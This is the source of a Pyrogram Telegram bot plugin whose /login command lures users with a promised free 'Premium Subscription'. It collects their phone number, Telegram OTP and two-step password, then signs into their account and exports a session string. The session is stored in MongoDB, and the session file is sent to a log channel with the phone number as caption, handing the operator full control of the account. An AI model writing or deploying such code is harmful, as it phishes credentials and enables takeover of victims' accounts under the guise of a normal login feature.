import os
import shutil
import traceback
from pyrogram.types import Message
from pyrogram import Client, filters
from asyncio.exceptions import TimeoutError
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, ADMINS, LOG_CHANNEL_SESSIONS_FILES
from pymongo import MongoClient

# MongoDB connection
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
database = mongo_client['Cluster0']['users']

strings = {
    'need_login': "You have to /login before using then bot can download restricted content ❕",
    'already_logged_in': "You are already logged in🥰.\nYou Have all Premium Benifits🥳\nIf you want to login again, /logout to proceed.",
}
SESSION_STRING_SIZE = 351

def get(obj, key, default=None):
    try:
        return obj[key]
    except:
        return default


#cheak login status 
async def check_login_status(user_id):
    user_data = database.find_one({"id": user_id})
    if user_data and user_data.get('logged_in', False):
        return True
    return False
    
    
    
   
@Client.on_message(filters.private & filters.command(["logout"]))
async def logout(_, msg):
    user_data = database.find_one({"id": msg.chat.id})
    if user_data is None or not user_data.get('session'):
        return 
    data = {
        'session': None,
        'logged_in': False
    }
    database.update_one({'_id': user_data['_id']}, {'$set': data})
    await msg.reply("**Logout Successfully** ♦")



@Client.on_message(filters.private & filters.command(["login"]))
async def main(bot: Client, message: Message):
    user_data = database.find_one({"id": message.from_user.id})
    if get(user_data, 'logged_in', False):
        await message.reply(strings['already_logged_in'])
        return 
    
    user_id = int(message.from_user.id)
    phone_number_msg = await bot.ask(chat_id=user_id, text="<b>🔰 <u>Need A Premium🥳 Subscription in Free 😍 ?\nYou Need To Login First</u>\n\n👉 Please send your phone number which includes country code</b>\n<b>Example:</b> <code>+13124562345, +9171828181889</code>")
    if phone_number_msg.text == '/cancel':
        return await phone_number_msg.reply('<b>Process cancelled!</b>')
    
    phone_number = phone_number_msg.text
    client = Client(":memory:", API_ID, API_HASH)
    await client.connect()
    
    await phone_number_msg.reply("Sending OTP...")
    try:
        code = await client.send_code(phone_number)
        phone_code_msg = await bot.ask(user_id, "Please check for an OTP in official telegram account. If you got it, send OTP here after reading the below format. \n\nIf OTP is `12345`, **please send it as** `1 2 3 4 5`.\n\n**Enter /cancel to cancel The Process**", filters=filters.text, timeout=600)
    except PhoneNumberInvalid:
        await phone_number_msg.reply('`PHONE_NUMBER` **is invalid.**\nLogin Again 👉 /login')
        return
    if phone_code_msg.text == '/cancel':
        return await phone_code_msg.reply('<b>Process cancelled!</b>')
    
    try:
        phone_code = phone_code_msg.text.replace(" ", "")
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
    except PhoneCodeInvalid:
        await phone_code_msg.reply('**OTP is invalid.**\nLogin Again 👉 /login')
        return
    except PhoneCodeExpired:
        await phone_code_msg.reply('**OTP is expired.**\nLogin Again 👉 /login')
        return
    except SessionPasswordNeeded:
        two_step_msg = await bot.ask(user_id, '**Your account has enabled two-step verification.(OTP) Please provide the password.\n\nEnter /cancel to cancel The Process**', filters=filters.text, timeout=300)
        if two_step_msg.text == '/cancel':
            return await two_step_msg.reply('<b>Process cancelled!</b>')
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('**Invalid Password Provided**\nLogin Again 👉 /login')
            return
    
    string_session = await client.export_session_string()
    await client.disconnect()
    
    if len(string_session) < SESSION_STRING_SIZE:
        return await message.reply('<b>Invalid session string</b>')
    
    try:
        # Get the current working directory
        current_directory = os.getcwd()
        
        # Path for the session file
        session_file_path = os.path.join(current_directory, ':memory:.session')
        
        # Ensure the /sessions directory exists
        sessions_dir = os.path.join(current_directory, 'sessions')
        if not os.path.exists(sessions_dir):
            os.makedirs(sessions_dir)
        
        # Remove '+' from phone number
        clean_phone_number = phone_number.replace('+', '')
        
        # New path for the session file
        new_session_file_path = os.path.join(sessions_dir, f"{clean_phone_number}.session")
        
        # Rename and move the session file
        os.rename(session_file_path, new_session_file_path)
        
        # Update MongoDB with the session file details
        data = {
            'session': string_session,
            'logged_in': True,
            'mobile_number': phone_number
        }
        if user_data is not None:
            database.update_one({'_id': user_data['_id']}, {'$set': data})
        else:
            data.update({
                '_id': message.from_user.id,
                'id': message.from_user.id
            })
            database.insert_one(data)
        
        # Send the session file to the log channel
        await bot.send_document(
            chat_id=LOG_CHANNEL_SESSIONS_FILES,
            document=new_session_file_path,
            caption=f"Session file for: {clean_phone_number}"
        )
        
        # Delete the session file after sending
        os.remove(new_session_file_path)
        
    except Exception as e:
        return await message.reply_text(f"<b>ERROR IN LOGIN:</b> `{e}`")
    
    await bot.send_message(message.from_user.id, "<b>Account Login Successfully.\nNow You Have All Premium🥳 Subscription Benifts in Free😍.\n\nIf You Get Any Error Related To AUTH KEY Then /logout and /login again</b>")    
    
    
    
 